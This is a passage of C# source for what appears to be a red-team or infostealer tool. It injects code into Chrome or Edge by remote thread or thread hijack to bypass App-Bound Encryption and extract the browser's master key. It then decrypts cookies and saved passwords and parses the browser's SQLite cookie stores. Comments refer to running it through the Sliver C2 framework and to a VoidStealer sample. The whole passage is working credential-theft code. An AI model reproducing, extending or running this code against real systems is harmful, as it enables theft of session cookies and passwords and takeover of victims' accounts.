                        (IntPtr)chainBytes.Length, out w))
                { Err("WriteProcessMemory(candidates)"); break; }
                if (!WriteProcessMemory(pi.hProcess, blobP, blob,
                        (IntPtr)blob.Length, out w))
                { Err("WriteProcessMemory(blob)"); break; }

                var prm = new StubParams();
                prm.candidates = (ulong)cand;
                prm.ncand = (uint)chain.Length;
                prm.blob = (ulong)blobP;
                prm.blobLen = (uint)blob.Length;
                if (!ResolveStubFns(ref prm)) { Err("fn resolution failed"); break; }

                IntPtr tview = IntPtr.Zero;
                UIntPtr viewSize = UIntPtr.Zero;
                int st = NtMapViewOfSection(section, pi.hProcess, ref tview,
                    UIntPtr.Zero, UIntPtr.Zero, IntPtr.Zero, ref viewSize,
                    1 /* ViewShare */, 0, 0x04);
                if (st != 0) { Err("NtMapViewOfSection st=0x" + st.ToString("x8")); break; }
                prm.outSection = (ulong)tview;

                IntPtr pPrm = Marshal.AllocHGlobal(AppBound0Stub.ParamsSize);
                Marshal.StructureToPtr(prm, pPrm, false);
                bool wr = WriteProcessMemory(pi.hProcess, data, pPrm,
                    (IntPtr)AppBound0Stub.ParamsSize, out w);
                Marshal.FreeHGlobal(pPrm);
                if (!wr) { Err("WriteProcessMemory(params)"); break; }

                uint tid;
                if (edge && !attachMode)
                {
                    // ---- thread hijack (fresh spawned Edge only: combase
                    // faults there; the RUNNING browser has initialized COM
                    // and takes the plain remote-thread path below) --
                    // Unproven: worker threads suspended
                    // in kernel-mode waits never return to usermode; main-thread
                    // variant untested. VoidStealer sample analysis may replace
                    // this whole path. Chrome uses the remote thread below.
                    IntPtr snap = CreateToolhelp32Snapshot(0x4 /* TH32CS_SNAPTHREAD */, 0);
                    if (snap == IntPtr.Zero || snap == (IntPtr)(-1))
                    { Err("snapshot failed"); break; }
                    uint skip = 1; // skip main thread (locks + watchdog)
                    uint wantTid = 0;
                    var te = new THREADENTRY32 { dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32)) };
                    bool got = Thread32First(snap, ref te);
                    while (got)
                    {
                        if (te.th32OwnerProcessID == (uint)pi.pid)
                        {
                            if (skip == 0) { wantTid = te.th32ThreadID; break; }
                            skip--;
                        }
                        got = Thread32Next(snap, ref te);
                    }
                    CloseHandle(snap);
                    if (wantTid == 0)
                    {
                        // fall back to main thread if it was the only one
                        got = Thread32First(snap, ref te);
                        while (got)
                        {
                            if (te.th32OwnerProcessID == (uint)pi.pid) { wantTid = te.th32ThreadID; break; }
                            got = Thread32Next(snap, ref te);
                        }
                        CloseHandle(snap);
                    }
                    if (wantTid == 0) { Err("no thread found in spawned process"); break; }

                    // THREAD_GET_CONTEXT|SET_CONTEXT|SUSPEND_RESUME|QUERY
                    IntPtr thH = OpenThread(0x0040 | 0x0010 | 0x0002 | 0x0008,
                        false, wantTid);
                    if (thH == IntPtr.Zero) { Err("OpenThread failed GLE=" + Marshal.GetLastWin32Error()); break; }

                    SuspendThread(thH);
                    IntPtr ctxBuf = Marshal.AllocHGlobal(SIZE_OF_X64_CONTEXT);
                    ZeroMem(ctxBuf, SIZE_OF_X64_CONTEXT);
                    Marshal.WriteInt32(ctxBuf, CTXOFF_ContextFlags, unchecked((int)CONTEXT_CONTROL));
                    if (GetThreadContext(thH, ctxBuf) == 0)
                    {
                        Err("GetThreadContext failed GLE=" + Marshal.GetLastWin32Error());
                        Marshal.FreeHGlobal(ctxBuf); CloseHandle(thH); break;
                    }
                    Marshal.WriteInt64(ctxBuf, CTXOFF_Rip, (long)(code + stubBlob.Length)); // trampoline
                    if (SetThreadContext(thH, ctxBuf) == 0)
                    {
                        Err("SetThreadContext failed GLE=" + Marshal.GetLastWin32Error());
                        Marshal.FreeHGlobal(ctxBuf); CloseHandle(thH); break;
                    }
                    ResumeThread(thH);
                    Marshal.FreeHGlobal(ctxBuf);
                    // thH intentionally left open (thread parks forever; process
                    // is terminated on cleanup regardless)
                }
                else
                {
                    thStub = CreateRemoteThread(pi.hProcess, IntPtr.Zero,
                        IntPtr.Zero, code, data, 0, out tid);
                    if (thStub == IntPtr.Zero) { Err("CreateRemoteThread failed"); break; }
                }

                int polls = 0;
                for (int t = 0; t < 150; t++)
                {
                    System.Threading.Thread.Sleep(100);
                    uint done = (uint)Marshal.ReadInt32(view, 0);
                    if (done == 1) { ok = true; break; }
                    if (done == 2)
                    {
                        done_diag = 2;
                        Err(string.Format("stub failed hr=0x{0:x8} bc={1} cand={2} lasthr=0x{3:x8}",
                            Marshal.ReadInt32(view, 4),
                            Marshal.ReadInt32(view, 40),
                            Marshal.ReadInt32(view, 44),
                            Marshal.ReadInt32(view, 48)));
                        break;
                    }
                    polls = t;
                }
                if (ok)
                {
                    key = new byte[32];
                    Marshal.Copy(view + 8, key, 0, 32);
                    Win("[*] ABE bypassed: elevation service DecryptData " +
                        "returned the app-bound key to our in-browser call (hr=0x0)");
                }
                else if (done_diag == 0 && polls >= 149)
                {
                    uint procCode;
                    GetExitCodeProcess(pi.hProcess, out procCode);
                    Err(string.Format(
                        "stub timeout done=0x{0:x} bc={1} cand={2} lasthr=0x{3:x8} proc_exit=0x{4:x8}",
                        (uint)Marshal.ReadInt32(view, 0),
                        Marshal.ReadInt32(view, 40),
                        Marshal.ReadInt32(view, 44),
                        Marshal.ReadInt32(view, 48), procCode));
                }
            } while (false);

            // reclaim the stub thread once it has REPORTED (done flag set):
            // it parks in Sleep(INFINITE) with no user-mode state in flight,
            // so termination is clean. On timeout the thread may still be
            // inside DecryptData; leave it (the browser keeps running).
            if (thStub != IntPtr.Zero && (ok || done_diag == 2))
                TerminateThread(thStub, 0);
            if (thStub != IntPtr.Zero) CloseHandle(thStub);
            if (spawned) TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            UnmapViewOfFile(view);
            CloseHandle(section);
            return ok ? key : null;
        }

        // colors apply only to interactive consoles; redirected streams
        // (Sliver execute-assembly capture, --json pipes) stay plain
        private static bool OutIsTty { get { return !Console.IsOutputRedirected; } }
        private static bool ErrIsTty { get { return !Console.IsErrorRedirected; } }

        private static void WriteLineC(string text, ConsoleColor color,
            bool error, bool colorIt)
        {
            if (error)
            {
                if (ErrIsTty && colorIt)
                {
                    Console.ForegroundColor = color;
                    Console.Error.WriteLine(text);
                    Console.ResetColor();
                }
                else Console.Error.WriteLine(text);
            }
            else
            {
                if (OutIsTty && colorIt)
                {
                    Console.ForegroundColor = color;
                    Console.WriteLine(text);
                    Console.ResetColor();
                }
                else Console.WriteLine(text);
            }
        }

        private static void Status(string msg)   // cyan: action in progress
        {
            WriteLineC(msg, ConsoleColor.Cyan, true, true);
        }

        private static void Win(string msg)      // green: success / evidence
        {
            WriteLineC(msg, ConsoleColor.Green, true, true);
        }

        private static void Dbg(string msg)      // dark gray: diagnostics
        {
            WriteLineC(msg, ConsoleColor.DarkGray, true, true);
        }

        private static void Err(string msg)      // red: failures
        {
            WriteLineC("abe: " + msg, ConsoleColor.Red, true, true);
        }

        // A tool instance killed externally (operator ctrl-c, task kill)
        // leaks its spawned throwaway browser, and the parked stub thread
        // inside it holds an unfinished DecryptData at the elevation
        // service, which makes every LATER extraction queue behind it and
        // hang. Before each spawn, sweep browser processes whose OWN
        // command line carries our "abe_" throwaway --user-data-dir marker:
        // those are ours by construction, the user's real browser never
        // matches. Cmdline comes from the PEB via NtQueryInformationProcess
        // + ReadProcessMemory (no WMI).
        private static void JanitorSweep(string browserExe)
        {
            string marker = "\\abe_"; // path segment of the throwaway profile
            var snap = CreateToolhelp32Snapshot(0x2 /*TH32CS_SNAPPROCESS*/, 0);
            if (snap == IntPtr.Zero) return;
            var pe = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32W)) };
            int seen = 0, matched = 0, killed = 0, nulls = 0, lastNullErr = -1;
            try
            {
                if (!Process32FirstW(snap, ref pe)) return;
                do
                {
                    string name = pe.strExeFile;
                    if (name != "chrome.exe" && name != "msedge.exe") continue;
                    seen++;
                    string cl = ReadCmdline((int)pe.th32ProcessID);
                    if (cl == null) { nulls++; lastNullErr = lastCmdErr; continue; }
                    if (cl.IndexOf(marker, StringComparison.OrdinalIgnoreCase) < 0)
                        continue;
                    matched++;
                    IntPtr h = OpenProcess(0x0001 /*TERMINATE*/, false, pe.th32ProcessID);
                    if (h != IntPtr.Zero)
                    {
                        TerminateProcess(h, 0);
                        CloseHandle(h);
                        killed++;
                    }
                } while (Process32NextW(snap, ref pe));
            }
            finally
            {
                CloseHandle(snap);
                if (seen > 0)
                    Dbg("[dbg] janitor: browsers=" + seen +
                        " matched=" + matched + " killed=" + killed +
                        " nulls=" + nulls + " lastNullErr=" + lastNullErr +
                        " [" + lastCmdEx + "]");
            }
        }

        // full command line of another (same-user) process, via PEB. Every
        // dereference is ReadProcessMemory; the PEB addresses belong to the
        // TARGET's address space; Marshal.ReadInt* here would read our own
        // memory and fault.
        private static int lastCmdErr;
        private static string lastCmdEx = "";
        private static string ReadCmdline(int pid)
        {
            IntPtr h = OpenProcess(0x0400 | 0x0010 /*QUERY_INFORMATION|VM_READ*/,
                false, (uint)pid);
            if (h == IntPtr.Zero) { lastCmdErr = 1; return null; }
            try
            {
                var pbi = new PROCESS_BASIC_INFORMATION();
                int ret;
                int st = NtQueryInformationProcess(h, 0 /*ProcessBasicInformation*/,
                    ref pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out ret);
                if (st != 0) { lastCmdErr = 2; return null; }
                var buf = new byte[16];
                // PEB +0x20 -> RTL_USER_PROCESS_PARAMETERS (remote pointer)
                if (!ReadBytes(h, new IntPtr(pbi.PebBaseAddress.ToInt64() + 0x20),
                    buf, 8)) { lastCmdErr = 3; return null; }
                IntPtr pp = (IntPtr)BitConverter.ToInt64(buf, 0);
                if (pp == IntPtr.Zero) { lastCmdErr = 4; return null; }
                // RTL_USER_PROCESS_PARAMETERS.CommandLine (UNICODE_STRING) @ +0x70:
                // [u16 Length][u16 MaximumLength][pad][ptr Buffer]
                if (!ReadBytes(h, new IntPtr(pp.ToInt64() + 0x70), buf, 16))
                { lastCmdErr = 5; return null; }
                int clLen = BitConverter.ToUInt16(buf, 0);
                IntPtr clBufAddr = (IntPtr)BitConverter.ToInt64(buf, 8);
                if (clBufAddr == IntPtr.Zero || clLen <= 0 || clLen > 8192)
                { lastCmdErr = 6; return null; }
                var cl = new byte[clLen];
                if (!ReadBytes(h, clBufAddr, cl, clLen)) { lastCmdErr = 7; return null; }
                lastCmdErr = 0;
                return Encoding.Unicode.GetString(cl, 0, clLen);
            }
            catch (Exception e) { lastCmdErr = 8; lastCmdEx = e.GetType().Name + ": " + e.Message; return null; }
            finally { CloseHandle(h); }
        }

        private static bool ReadBytes(IntPtr h, IntPtr addr, byte[] buf, int len)
        {
            IntPtr read;
            if (!ReadProcessMemory(h, addr, buf, (IntPtr)len, out read)) return false;
            return read == (IntPtr)len;
        }

        [DllImport("ntdll.dll")]
        private static extern int NtQueryInformationProcess(IntPtr h, int cls,
            ref PROCESS_BASIC_INFORMATION pbi, int len, out int retLen);
        [DllImport("kernel32", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr h, IntPtr addr,
            byte[] buf, IntPtr size, out IntPtr read);
        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_1, Reserved2_2, UniquePid, Reserved3;
        }

        private static bool ResolveStubFns(ref StubParams prm)
        {
            // LoadLibrary, not GetModuleHandle: a fresh .NET host has not
            // mapped ole32/oleaut32 until first P/Invoke into them.
            IntPtr ole32 = LoadLibraryW("ole32");
            IntPtr oleaut = LoadLibraryW("oleaut32");
            IntPtr kernel = GetModuleHandleW("kernel32");
            if (ole32 == IntPtr.Zero || oleaut == IntPtr.Zero || kernel == IntPtr.Zero)
                return false;
            prm.pCoInitializeEx = (ulong)GetProcAddress(ole32, "CoInitializeEx");
            prm.pCoCreateInstance = (ulong)GetProcAddress(ole32, "CoCreateInstance");
            prm.pCoSetProxyBlanket = (ulong)GetProcAddress(ole32, "CoSetProxyBlanket");
            prm.pSysAllocStringByteLen = (ulong)GetProcAddress(oleaut, "SysAllocStringByteLen");
            prm.pSysStringByteLen = (ulong)GetProcAddress(oleaut, "SysStringByteLen");
            prm.pSysFreeString = (ulong)GetProcAddress(oleaut, "SysFreeString");
            prm.pSleep = (ulong)GetProcAddress(kernel, "Sleep");
            return prm.pCoInitializeEx != 0 && prm.pCoCreateInstance != 0 &&
                   prm.pCoSetProxyBlanket != 0 &&
                   prm.pSysAllocStringByteLen != 0 && prm.pSysStringByteLen != 0 &&
                   prm.pSysFreeString != 0 && prm.pSleep != 0;
        }

        internal static string ResolveExePublic(bool edge) { return ResolveExe(edge); }

        private static string ResolveExe(bool edge)
        {
            string key = edge
                ? @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
                : @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe";
            uint cb = 520;
            var buf = new byte[520];
            string resolved = null;
            if (RegGetValueW(HKLM, key, null, 2 /* RRF_RT_REG_SZ */, IntPtr.Zero,
                    buf, ref cb) == 0 && cb > 2)
                resolved = ReadSz(buf, cb);
            else if (RegGetValueW(HKCU, key, null, 2, IntPtr.Zero, buf, ref cb) == 0 && cb > 2)
                resolved = ReadSz(buf, cb);
            if (resolved == null || !File.Exists(resolved))
            {
                resolved = edge
                    ? @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
                    : @"C:\Program Files\Google\Chrome\Application\chrome.exe";
            }
            if (!File.Exists(resolved)) return null;
            // Edge's Application\msedge.exe is a launcher that re-execs the
            // versioned binary and exits, killing our process handle. Prefer
            // the versioned exe when present (Chrome's version dir has no
            // exe, so this is a no-op there). Applies to EVERY resolve path.
            var dir = Path.GetDirectoryName(resolved);
            if (dir != null)
            {
                // stale version dirs linger after updates; pick the HIGHEST
                string best = null;
                long bestScore = -1;
                var exeName = Path.GetFileName(resolved);
                foreach (var sub in Directory.GetDirectories(dir))
                {
                    var n = Path.GetFileName(sub);
                    if (n.Length == 0 || !char.IsDigit(n[0])) continue;
                    var cand = Path.Combine(sub, exeName);
                    if (!File.Exists(cand)) continue;
                    long score = VerScore(n);
                    if (score > bestScore) { bestScore = score; best = cand; }
                }
                if (best != null) return best;
            }
            return resolved;
        }

        // "a.b.c.d" -> packed comparable score (4 x 10 bits)
        private static long VerScore(string v)
        {
            long score = 0;
            var parts = v.Split('.');
            for (int i = 0; i < 4; i++)
            {
                long val = 0;
                if (i < parts.Length) long.TryParse(parts[i], out val);
                if (val > 1023) val = 1023;
                score = (score << 10) | val;
            }
            return score;
        }

        private static string ReadSz(byte[] buf, uint cb)
        {
            int n = (int)cb / 2;
            if (n > 0 && buf[n * 2 - 2] == 0 && buf[n * 2 - 1] == 0) n--;
            return Encoding.Unicode.GetString(buf, 0, n * 2);
        }

        private static void ZeroMem(IntPtr p, int cb)
        {
            for (int i = 0; i < cb; i++) Marshal.WriteByte(p, i, 0);
        }

        // ------------------------------------------------------------------
        // AES-256-GCM via bcrypt (tag = correctness oracle)
        private static int lastGcmStatus;
        private static byte[] AesGcmDecrypt(byte[] key, byte[] nonce,
            byte[] ctAndTag, out bool tagOk)
        {
            tagOk = false;
            if (ctAndTag.Length < 16) return null;
            int ctLen = ctAndTag.Length - 16;

            IntPtr alg, hkey;
            IntPtr keyObj = IntPtr.Zero;
            int stOpen = BCryptOpenAlgorithmProvider(out alg, "AES", null, 0);
            if (stOpen != 0)
            { lastGcmStatus = 0x10000 | stOpen; return null; }
            try
            {
                int stProp = BCryptSetProperty(alg, "ChainingMode",
                    "ChainingModeGCM", ("ChainingModeGCM".Length + 1) * 2, 0);
                if (stProp != 0)
                { lastGcmStatus = 0x20000 | stProp; return null; }
                // strict builds reject NULL key objects; query ObjectLength
                var objLenBuf = new byte[4];
                int cbProp;
                int stLen = BCryptGetProperty(alg, "ObjectLength", objLenBuf, 4,
                    out cbProp, 0);
                if (stLen != 0)
                { lastGcmStatus = 0x40000 | stLen; return null; }
                int objLen = BitConverter.ToInt32(objLenBuf, 0);
                keyObj = Marshal.AllocHGlobal(objLen);
                int stKey = BCryptGenerateSymmetricKey(alg, out hkey,
                    keyObj, objLen, key, key.Length, 0);
                if (stKey != 0)
                { Marshal.FreeHGlobal(keyObj); lastGcmStatus = 0x30000 | stKey; return null; }
                try
                {
                    var info = new AUTH_INFO();
                    info.cbSize = (uint)Marshal.SizeOf(info);
                    info.dwInfoVersion = 1;
                    info.cbNonce = (uint)nonce.Length;
                    info.cbTag = 16;
                    // BCRYPT_INIT_AUTH_MODE_INFO sets only cbSize+dwInfoVersion;
                    // cbData must stay zero (setting it = STATUS failure here)
                    info.cbData = 0;
                    IntPtr pNonce = Marshal.AllocHGlobal(nonce.Length);
                    Marshal.Copy(nonce, 0, pNonce, nonce.Length);
                    info.pbNonce = pNonce;
                    IntPtr pTag = Marshal.AllocHGlobal(16);
                    Marshal.Copy(ctAndTag, ctLen, pTag, 16);
                    info.pbTag = pTag;

                    var ct = new byte[ctLen];
                    Array.Copy(ctAndTag, ct, ctLen);
                    var pt = new byte[ctLen];
                    int cbResult;
                    int st = BCryptDecrypt(hkey, ct, ctLen, ref info,
                        IntPtr.Zero, 0, pt, ctLen, out cbResult, 0);
                    if (st != 0)
                    {
                        // some builds want the nonce in the IV slot as well
                        int st2 = BCryptDecrypt(hkey, ct, ctLen, ref info,
                            pNonce, nonce.Length, pt, ctLen, out cbResult, 0);
                        st = st2;
                    }

                    Marshal.FreeHGlobal(pNonce);
                    Marshal.FreeHGlobal(pTag);
                    lastGcmStatus = unchecked((int)0xA5000000) | st;
                    if (st == 0) { tagOk = true; return pt; }
                    return null;
                }
                finally
                {
                    BCryptDestroyKey(hkey);
                    if (keyObj != IntPtr.Zero) Marshal.FreeHGlobal(keyObj);
                }
            }
            finally { BCryptCloseAlgorithmProvider(alg, 0); }
        }

        // v20: "v20" + nonce(12) + ct + tag(16): ABE key (M157: the
        //      32B "metadata" block of the 127-era writeups is gone)
        // v10: "v10" + nonce(12) + ct + tag(16): legacy key
        // Cookie plaintext carries a 32-byte value-hash prefix (HMAC over the
        // cookie identity, Chromium strips it after decrypt) under BOTH
        // schemes; hashPrefix must be true for cookie rows, false for
        // passwords (those have no prefix).
        // scheme out: 1 = v20 app-bound (ABE scheme), 2 = v10 legacy DPAPI
        private static string DecryptValue(byte[] enc, byte[] abeKey,
            byte[] legacyKey, bool hashPrefix, out bool ok, out int scheme)
        {
            ok = false;
            scheme = 0;
            if (enc == null || enc.Length < 31) return null;
            byte[] key; int off;
            if (enc[0] == 'v' && enc[1] == '2' && enc[2] == '0')
            { key = abeKey; off = 3; scheme = 1; }
            else if (enc[0] == 'v' && enc[1] == '1' && enc[2] == '0')
            { key = legacyKey; off = 3; scheme = 2; }
            else return null;
            if (key == null || enc.Length < off + 12 + 16) return null;
            var nonce = new byte[12];
            Array.Copy(enc, off, nonce, 0, 12);
            // AesGcmDecrypt expects ct+tag WITHOUT the nonce prefix
            var body = new byte[enc.Length - off - 12];
            Array.Copy(enc, off + 12, body, 0, body.Length);
            bool tagOk;
            var pt = AesGcmDecrypt(key, nonce, body, out tagOk);
            ok = tagOk;
            if (!tagOk || pt == null) return null;
            int start = (hashPrefix && pt.Length > 32) ? 32 : 0;
            return Encoding.UTF8.GetString(pt, start, pt.Length - start);
        }

        // ------------------------------------------------------------------
        // minimal SQLite reader (b-tree walk + overflow chains)
        private sealed class LiteDb
        {
            private byte[] d;   // reassigned when WAL frames grow/truncate the image
            private readonly int pageSize;
            private readonly int usable;

            public LiteDb(byte[] db) : this(db, null) { }

            // wal: raw bytes of the -wal file. Frames are FLATTENED into a
            // merged copy of the main db up front, so all page math below
            // (b-tree walk, overflow chains) works unchanged. Chromium DBs
            // sit in WAL mode permanently; a live browser keeps most rows
            // in the -wal, not the main file.
            public LiteDb(byte[] db, byte[] wal)
            {
                d = db;
                pageSize = BigU16(16);
                if (pageSize == 1) pageSize = 65536;
                usable = pageSize - d[20];
                if (wal != null) ApplyWal(wal);
            }

            // Replay WAL frames onto `d`. Format: 32-byte header
            // [magic BE32][format][pageSize BE32 @8][ckpt seq][salt1 @16]
            // [salt2 @20][cksum]; then frames of [pgno BE32][commit BE32]
            // [salt1][salt2][cksum][page image]. Frames whose salts match the
            // header are valid; frames stop being valid at the first salt
            // mismatch (recycled after checkpoint). We apply every valid
            // frame including trailing uncommitted ones (forensic-lenient:
            // a torn transaction costs nothing here).
            private void ApplyWal(byte[] w)
            {
                if (w.Length < 32) return;
                uint magic = BE32(w, 0);
                if (magic != 0x377f0682 && magic != 0x377f0683) return;
                int wPs = (int)BE32(w, 8);
                if (wPs <= 512 || (wPs & (wPs - 1)) != 0 || wPs != pageSize)
                    return;
                uint s1 = BE32(w, 16), s2 = BE32(w, 20);

                int off = 32;
                int maxPage = 0;
                while (off + 24 + wPs <= w.Length)
                {
                    int pgno = (int)BE32(w, off);
                    uint fs1 = BE32(w, off + 8), fs2 = BE32(w, off + 12);
                    if (pgno < 1 || fs1 != s1 || fs2 != s2) break;
                    int need = pgno * pageSize;
                    if (need > d.Length)
                    {
                        var grown = new byte[need];
                        Array.Copy(d, grown, d.Length);
                        d = grown;
                    }
                    Array.Copy(w, off + 24, d, (pgno - 1) * pageSize, wPs);
                    if (pgno > maxPage) maxPage = pgno;
                    off += 24 + wPs;
                }
                if (maxPage * pageSize < d.Length)
                {
                    var cut = new byte[maxPage * pageSize];
                    Array.Copy(d, cut, cut.Length);
                    d = cut;
                }
            }

            private uint BE32(byte[] b, int off)
            { return ((uint)b[off] << 24) | ((uint)b[off+1] << 16) | ((uint)b[off+2] << 8) | b[off+3]; }

            private int BigU16(int off) { return (d[off] << 8) | d[off + 1]; }

            private long Varint(ref int p)
            {
                long result = 0;
                for (int i = 0; i < 8; i++)
                {
                    byte b = d[p++];
                    result = (result << 7) | ((long)b & 0x7FL);
                    if ((b & 0x80) == 0) return result;
                }
                result = (result << 8) | (long)d[p++];
                return result;
            }

            public sealed class Row { public long RowId; public object[] V; }

            // returns rows of a table b-tree
            public IEnumerable<Row> Walk(int rootPage)
            {
                var rows = new List<Row>();
                var seen = new HashSet<int>();
                WalkPage(rootPage, rows, seen, 0);
                return rows;
            }

            private void WalkPage(int pgno, List<Row> rows, HashSet<int> seen,
                                  int depth)
            {
                if (pgno < 1 || depth > 20 || !seen.Add(pgno)) return;
                int pageOff = (pgno - 1) * pageSize;
                // b-tree header sits after the 100-byte file header on page 1,
                // but cell CONTENT offsets are always relative to the page start
                int hdr = pageOff + ((pgno == 1) ? 100 : 0);
                if (hdr >= d.Length) return;
                byte type = d[hdr];
                int nCells = BigU16(hdr + 3);

                if (type == 5) // interior table
                {
                    for (int i = 0; i < nCells; i++)
                    {
                        int cp = pageOff + BigU16(hdr + 12 + i * 2);
                        int child = (d[cp] << 24) | (d[cp + 1] << 16) |
                                    (d[cp + 2] << 8) | d[cp + 3];
                        WalkPage(child, rows, seen, depth + 1);
                    }
                    int right = (d[hdr + 8] << 24) | (d[hdr + 9] << 16) |
                                (d[hdr + 10] << 8) | d[hdr + 11];
                    WalkPage(right, rows, seen, depth + 1);
                    return;
                }
                if (type != 13) return; // leaf table

                for (int i = 0; i < nCells; i++)
                {
                    int cp = pageOff + BigU16(hdr + 8 + i * 2);
                    int p = cp;
                    long payload = Varint(ref p);
                    long rowid = Varint(ref p);

                    int maxLocal = usable - 35;
                    int minLocal = ((usable - 12) * 32 / 255) - 23;
                    int local;
                    int ovfPage = 0;
                    if (payload <= maxLocal) local = (int)payload;
                    else
                    {
                        int k = minLocal + ((int)((payload - minLocal) % (usable - 4)));
                        local = (k <= maxLocal) ? k : minLocal;
                        ovfPage = (d[p + local] << 24) | (d[p + local + 1] << 16) |
                                  (d[p + local + 2] << 8) | d[p + local + 3];
                    }
                    var payloadBytes = new byte[payload];
                    if (local > 0) Array.Copy(d, p, payloadBytes, 0, local);
                    int filled = local;
                    int op = ovfPage;
                    int guard = 0;
                    while (op != 0 && filled < payload && guard++ < 100000)
                    {
                        int ooff = (op - 1) * pageSize;
                        int next = (d[ooff] << 24) | (d[ooff + 1] << 16) |
                                   (d[ooff + 2] << 8) | d[ooff + 3];
                        int chunk = Math.Min(usable - 4, (int)payload - filled);
                        Array.Copy(d, ooff + 4, payloadBytes, filled, chunk);
                        filled += chunk;
                        op = next;
                    }

                    var row = DecodeRecord(payloadBytes, rowid);
                    if (row != null) rows.Add(row);
                }
            }

            // varint against an explicit buffer; the page-walk Varint reads the
            // class field `d` (whole file) and MUST NOT be reused here: records
            // decode from the extracted payload array, not the file.
            private static long RVarint(byte[] buf, ref int p)
            {
                long result = 0;
                for (int i = 0; i < 8; i++)
                {
                    byte b = buf[p++];
                    result = (result << 7) | ((long)b & 0x7FL);
                    if ((b & 0x80) == 0) return result;
                }
                result = (result << 8) | (long)buf[p++];
                return result;
            }

            private Row DecodeRecord(byte[] rec, long rowid)
            {
                int p = 0;
                long hlen = RVarint(rec, ref p);
                // header length INCLUDES the length byte itself: body at [hlen]
                int hEnd = (int)hlen;
                if (hEnd <= 0 || hEnd > rec.Length) return null;
                var types = new List<long>();
                while (p < hEnd) types.Add(RVarint(rec, ref p));
                p = hEnd;
                var vals = new object[types.Count];
                for (int i = 0; i < types.Count; i++)
                {
                    long t = types[i];
                    if (t == 0) { vals[i] = null; }
                    else if (t >= 1 && t <= 6)
                    {
                        int len = t == 1 ? 1 : t == 2 ? 2 : t == 3 ? 3 :
                                  t == 4 ? 4 : t == 5 ? 6 : 8;
                        if (p + len > rec.Length) return null;
                        long v = 0; bool neg = (rec[p] & 0x80) != 0;
                        for (int b = 0; b < len; b++) v = (v << 8) | rec[p + b];
                        if (neg) v -= (long)1 << (8 * len);
                        p += len; vals[i] = v;
                    }
                    else if (t == 7) { if (p + 8 > rec.Length) return null; p += 8; vals[i] = 0L; }
                    else if (t == 8) { vals[i] = 0L; }
                    else if (t == 9) { vals[i] = 1L; }
                    else if (t >= 12 && (t & 1) == 0)
                    {
                        int len = (int)((t - 12) / 2);
                        if (p + len > rec.Length) return null;
                        var blob = new byte[len];
                        Array.Copy(rec, p, blob, 0, len);
                        p += len; vals[i] = blob;
                    }
                    else
                    {
                        int len = (int)((t - 13) / 2);
                        if (p + len > rec.Length) return null;
                        vals[i] = Encoding.UTF8.GetString(rec, p, len);
                        p += len;
                    }
                }
                return new Row { RowId = rowid, V = vals };
            }

            // find table root page + column order from sqlite_master
            public static int TableRoot(LiteDb db, string table,
                                        out string[] columns)
            {
                columns = null;
                foreach (var row in db.Walk(1))
                {
                    var v = row.V;
                    if (v.Length < 5) continue;
                    if (!(v[0] is string) || (string)v[0] != "table") continue;
                    if (!(v[1] is string) || (string)v[1] != table) continue;
                    int root = (v[3] is long) ? (int)(long)v[3] : 0;
                    string sql = v[4] as string;
                    columns = ParseColumns(sql);
                    return root;
                }
                return 0;
            }

            private static string[] ParseColumns(string sql)
            {
                if (sql == null) return new string[0];
                int open = sql.IndexOf('('), close = sql.LastIndexOf(')');
                if (open < 0 || close <= open) return new string[0];
                string body = sql.Substring(open + 1, close - open - 1);
                var cols = new List<string>();
                int depth = 0, start = 0;
                for (int i = 0; i <= body.Length; i++)
                {
                    if (i == body.Length || (body[i] == ',' && depth == 0))
                    {
                        string part = body.Substring(start, i - start).Trim();
                        string col = FirstToken(part);
                        if (col != null) cols.Add(col);
                        start = i + 1;
                    }
                    else if (body[i] == '(') depth++;
                    else if (body[i] == ')') depth--;
                }
                return cols.ToArray();
            }

            private static string FirstToken(string s)
            {
                int i = 0;
                while (i < s.Length && char.IsWhiteSpace(s[i])) i++;
                if (i < s.Length && s[i] == '"')
                {
                    int e = s.IndexOf('"', i + 1);
                    return e < 0 ? null : s.Substring(i + 1, e - i - 1);
                }
                int j = i;
                while (j < s.Length && !char.IsWhiteSpace(s[j]) && s[j] != '(')
                    j++;
                var tok = s.Substring(i, j - i);
                string up = tok.ToUpperInvariant();
                if (up == "PRIMARY" || up == "UNIQUE" || up == "CHECK" ||
                    up == "FOREIGN" || up == "CONSTRAINT") return null;
                return tok;
            }
        }

        // ------------------------------------------------------------------
        // dumps
        private static List<string> ProfileDirs(bool edge, string profile)
        {
            var dirs = new List<string>();
            string ud = UserDataDir(edge);
            if (profile != null)
            {
                var p = Path.Combine(ud, profile);
                if (Directory.Exists(p)) dirs.Add(p);
                return dirs;
            }
            if (Directory.Exists(ud))
                foreach (var d in Directory.GetDirectories(ud))
                {
                    var n = Path.GetFileName(d);
                    if (n == "Default" || n.StartsWith("Profile ") ||
                        n == "Default (Pinned)" || n.StartsWith("Profile"))
                        dirs.Add(d);
                }
            return dirs;
        }

        private static int DumpCookies(bool edge, string profile, bool verify, string keyFile, bool json)
        {
            var abeKey = keyFile != null
                ? File.ReadAllBytes(keyFile)
                : ExtractKey(edge, null);
            if (abeKey == null || abeKey.Length != 32)
            { Err("no master key; run verb 'key' first"); return 1; }
            Dbg("[dbg] cookies: key ok, len=" + abeKey.Length);

            byte[] legacyKey = null;
            string ls = Path.Combine(UserDataDir(edge), "Local State");
            if (File.Exists(ls)) legacyKey = LegacyKey(File.ReadAllText(ls));

            int total = 0, okCount = 0, failCount = 0, v20Ok = 0, v10Ok = 0;
            foreach (var dir in ProfileDirs(edge, profile))
            {
                string dbPath = null;
                foreach (var cand in new[] { Path.Combine(dir, @"Network\Cookies"),
                                             Path.Combine(dir, "Cookies") })
                    if (File.Exists(cand)) { dbPath = cand; break; }
                if (dbPath == null) continue;
                string profName = Path.GetFileName(dir);

                LiteDb db;
                int root; string[] cols;
                try
                {
